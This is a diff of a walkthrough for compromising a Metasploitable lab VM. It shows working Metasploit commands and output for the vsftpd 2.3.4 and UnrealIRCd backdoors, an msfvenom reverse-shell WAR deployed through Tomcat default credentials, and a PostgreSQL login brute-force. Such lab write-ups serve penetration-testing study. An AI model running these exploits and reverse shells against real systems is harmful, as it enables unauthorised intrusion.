@@ -112,7 +112,7 @@ Server username: uid=33, gid=33, euid=33, egid=33
 
 So we get a nice shell, let's move on now to another web app.
 
-## Phpmyadmin and MySQL
+## Phpmyadmin (and MySQL)
 
 We can assume that phpmyadmin is backed by MySQL that is listening on port 3306.
 
@@ -149,10 +149,144 @@ Query OK, 0 rows affected (0,00 sec)
 
 We can now login with this user on phpmyadmin.
 
-## Multidae
 
-> OWASP Mutillidae II is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. 
+## FTP
+
+The FTP server in use is vsftpd 2.3.4. This version is know for containing a backdoor that is easly exploitable with the `exploit/unix/ftp/vsftpd_234_backdoor` metasploit module. 
+
+```
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.195.128
+msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.195.128:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.195.128:21 - USER: 331 Please specify the password.
+[+] 192.168.195.128:21 - Backdoor service has been spawned, handling...
+[+] 192.168.195.128:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+
+[*] Command shell session 1 opened (192.168.195.1:59748 -> 192.168.195.128:6200) at 2018-06-06 18:54:41 +0200
+
+uid=0(root) gid=0(root)
+```
 
 
+## IRC
 
+Like vsftpd, the IRC server has a backdoor and it can be exploited with a module : `unix/ftp/vsftpd_234_backdoor`.
+```
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.195.128
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP double handler on 192.168.195.1:4444 
+[*] 192.168.195.128:6667 - Connected to 192.168.195.128:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.195.128:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo id4WBKhmd1VdD85V;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "id4WBKhmd1VdD85V\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.195.1:4444 -> 192.168.195.128:55144) at 2018-06-06 18:59:02 +0200
+
+id
+uid=0(root) gid=0(root)
+```
+
+## Apache tomcat
+
+After simply Googling for the tomcat manager defaults credentials, we can log in with tomcat/tomcat. From there, we can upload a war backdoor to gain a shell :
+
+* First, let's create the war file with msfvenom
+    ```
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.195.1 LPORT=9999 -f war > mywar.war  
+    Payload size: 123 bytes
+    Final size of war file: 1596 bytes
+    ```
+* Then, we look for the name of the jsp in the war file 
+    ```
+    jar xvf mywar.war  
+    créé : META-INF/
+    décompressé : META-INF/MANIFEST.MF
+    créé : WEB-INF/
+    décompressé : WEB-INF/web.xml
+    décompressé : mgcuxecsndzm.jsp
+    ```
+* We can now deploy our war file, create an meterpreter handler for our payload and gain a shell.
+    ```
+    msf > use exploit/multi/handler 
+    msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+    payload => linux/x86/meterpreter/reverse_tcp
+    msf exploit(multi/handler) > set LHOST 192.168.195.1
+    LHOST => 192.168.195.1
+    msf exploit(multi/handler) > set LPORT 9999
+    LPORT => 9999
+    msf exploit(multi/handler) > run
+
+    [*] Started reverse TCP handler on 192.168.195.1:9999
+    ```
+    The handler is listening so we can go to /mywar/mgcuxecsndzm.jsp
+    ```
+    [*] Sending stage (853256 bytes) to 192.168.195.128
+    [*] Meterpreter session 1 opened (192.168.195.1:9999 -> 192.168.195.128:54639) at 2018-06-07 12:02:23 +0200
+
+    meterpreter > shell
+    Process 6635 created.
+    Channel 1 created.
+    id
+    uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
+    ```
+
+    ## Postgresql
+
+    We the module `auxiliary/scanner/postgres/postgres_login`, we can try to find the postgresql credentials.
+
+    ```
+    msf > use auxiliary/scanner/postgres/postgres_login
+    msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1951.128
+    RHOSTS => 192.168.1951.128
+    msf auxiliary(scanner/postgres/postgres_login) > run
+    [-] Auxiliary failed: Msf::OptionValidateError The following options failed to validate: RHOSTS.
+    msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.195.128
+    RHOSTS => 192.168.195.128
+    msf auxiliary(scanner/postgres/postgres_login) > run
+
+    [-] 192.168.195.128:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+    [+] 192.168.195.128:5432 - Login Successful: postgres:postgres@template1
+    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+    [-] 192.168.195.128:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+    ```
+
+    We see that postgres/postgres are valids credentials. Now, let's inspect the content of the database.
+    ```
+    $ psql -h 192.168.195.128 -U postgres
+    postgres=# \l --> list the databases
+    postgres=# \dt --> list the tables
+    ```
+    Unfortunately, the database appears to be empty :(
+    
 
